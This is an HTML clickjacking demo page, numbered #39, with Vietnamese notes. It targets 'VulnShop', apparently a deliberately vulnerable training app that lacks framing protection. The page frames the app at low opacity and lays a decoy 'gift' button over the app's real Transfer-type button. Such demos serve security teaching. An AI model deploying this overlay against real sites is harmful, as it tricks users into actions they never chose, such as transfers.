<!doctype html>
<html>
  <head>
    <title>Clickjacking demo (#39)</title>
    <style>
      body { background: #0d1117; color: #e6edf3; font-family: system-ui; padding: 20px; }
      .frame { position: relative; width: 90%; height: 500px; border: 2px dashed #f85149; }
      iframe { width: 100%; height: 100%; opacity: 0.25; border: 0; }
      .overlay {
        position: absolute; left: 40%; top: 45%; z-index: 2;
        background: #3fb950; color: #000; padding: 12px 20px; border-radius: 8px;
      }
    </style>
  </head>
  <body>
    <h1>Clickjacking demo (#39)</h1>
    <p>
      VulnShop không gửi <code>X-Frame-Options</code> / <code>frame-ancestors</code> nên có thể bị nhúng iframe.
      Trang này nhúng app với opacity thấp và đặt nút "Click để nhận quà" TRÙM lên nút thật của app — nạn nhân
      tưởng bấm quà, thực ra bấm nút của app (ví dụ Transfer).
    </p>
    <div class="frame">
      <!-- chỉnh URL này thành domain VulnShop khi deploy -->
      <iframe src="/" width="100%" height="100%"></iframe>
      <button class="overlay">🎁 Click để nhận quà!</button>
    </div>
  </body>
</html>
